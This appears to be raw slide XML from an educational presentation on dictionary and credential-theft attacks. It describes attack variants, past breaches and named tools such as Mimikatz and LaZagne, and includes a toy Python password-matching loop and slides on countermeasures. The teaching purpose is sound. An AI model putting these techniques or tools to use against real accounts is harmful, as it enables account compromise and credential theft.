          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  A variant of brute force that uses a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>predefined list of common passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Faster than brute force because it avoids unlikely combinations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Relies on human tendency to use weak or common passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Often uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>leaked password lists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> from previous breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Automated using tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>Cain &amp; Abel, John the Ripper</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Targets login portals, email accounts, Wi-Fi passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Success depends on whether users follow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>poor password practices</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Harder to detect compared to brute force because attempts are fewer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259465800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DD2E1-CF51-B94B-437C-AF83E1A55D20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Types of Dictionary Attacks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{927D2276-54A1-5DF8-FEDD-3895C75000D3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>1. Standard Dictionary Attack: Tests each word in the dictionary file against the target system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>2. Hybrid Dictionary Attack: Enhances dictionary words with modifications like numbers, symbols, or capitalization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>3. Rainbow Table Attack: Uses precomputed hash values of dictionary words to crack password hashes quickly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>4. Reverse Dictionary Attack: Attempts to match a known password across multiple usernames.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>5. Credential Stuffing: Uses previously leaked credentials to attempt logins on other systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="203648337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8723E-ECEF-79BA-08C2-92E75DD9EF19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Real-World Examples</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D6ECD39-BA66-407C-EDE6-31948B9D86CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>- LinkedIn Breach (2012): Millions of user credentials leaked, later used in dictionary and credential stuffing attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>- Adobe Data Breach (2013): Over 150 million accounts compromised, with attackers leveraging dictionary-based guessing to crack weakly encrypted passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>- WordPress Sites: Commonly targeted with automated dictionary attacks against admin login pages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="205548394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D73F1-CF07-BD33-B212-7A2AA5B7B18C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dictionary Attack Example in Python</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DCB64B17-D6FD-0C49-CF8E-13E41AA98122}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1338417" y="1071808"/>
            <a:ext cx="5622822" cy="4031873"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Here’s a simple Python example (for educational purposes only):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>```python</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>password = "secret123"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>dictionary = ["123456", "password", "qwerty", "secret", "secret123"]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>for word in dictionary:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    if word == password:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>        print("Password found:", word)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>        break</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>```</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>This script iterates through a small dictionary list and successfully identifies the password 'secret123'.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="49568937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AF4B1-69BD-8A1C-B26F-0643C52D519D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F05C1B-5A04-1731-71BF-097231FAE6C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>strong password complexity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> (uppercase, lowercase, numbers, special characters).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>password blacklists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> to block common/compromised passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Store passwords using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0" err="1"/>
              <a:t>bcrypt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>, Argon2, or PBKDF2 hashing with salt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>account lockouts / CAPTCHA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> after failed attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Monitor login logs for repeated failed attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Encourage </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>password managers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> for strong unique passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Require </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>MFA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> to reduce reliance on passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="81582530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CA41D-24FB-A4E1-3B22-6580FF8DA7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2DBC0F-6F5D-5B45-8480-BCB37E86E1F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Credential Theft</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F5E3860-5F05-077E-5638-F10A955B21C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Attacker steals valid credentials (username/password) through malicious means.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Methods: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>keyloggers, malware, phishing, database breaches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Credentials may be sold on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>dark web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Often used in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>credential stuffing attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> (reuse stolen credentials).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  One stolen account may allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>lateral movement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> to others.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Can bypass authentication if no additional checks exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  High risk if passwords are reused across multiple sites.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Target: banking, enterprise logins, email, cloud services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="95551853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0786F-2A77-EF70-83F3-E7E0D932F1AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How Credential Theft Attacks Work</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0E54F356-00F0-C600-681A-921EF9994AEC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Credential theft usually begins with attackers targeting individuals or organizations to steal login information. Common techniques include:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>- Phishing: Sending deceptive emails or websites that trick users into providing credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>- Keylogging: Malware records keystrokes to capture passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>- Man-in-the-Middle (MITM) Attacks: Intercepting communications to steal login information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>- Credential Dumping: Extracting stored credentials from compromised systems using tools.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>- Social Engineering: Manipulating users into revealing login details.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="71626977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4C1F7-3DAB-7D33-5585-1B2EB27D5E1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Types of Credential Theft Attacks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{902EB9FA-D669-57F5-DB44-1E4965452440}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>1. Phishing Attacks: Trick users into entering credentials on fake websites.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>2. Spear Phishing: Targeted phishing with customized messages for specific victims.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>3. Password Spraying: Using a few common passwords across many accounts to avoid detection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>4. Credential Dumping: Extracting credentials from memory, LSASS, or password databases.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>5. Malware-Based Attacks: Using keyloggers, trojans, or spyware to steal credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>6. Insider Threats: Employees or contractors stealing credentials for malicious purposes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="213865427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5FEAF-49A0-E61F-C33F-7E7DBFF88881}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Tools Used in Credential Theft Attacks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3AEA660-18AE-A54A-5FBD-1152C6A90E2B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>: Extracts plaintext passwords, hashes, and PIN codes from Windows systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0" err="1"/>
              <a:t>LaZagne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>: Retrieves stored credentials from various applications and browsers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>- Wireshark: Can capture unencrypted login traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>- Keylogger Software: Logs keystrokes to steal login data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>- Phishing Kits: Pre-built tools to launch phishing campaigns easily.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="131242889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D8E94-0AA7-84AE-FC73-C9657D0D99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B9FDD-6DA7-2C6A-8465-B2A689BCD8BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
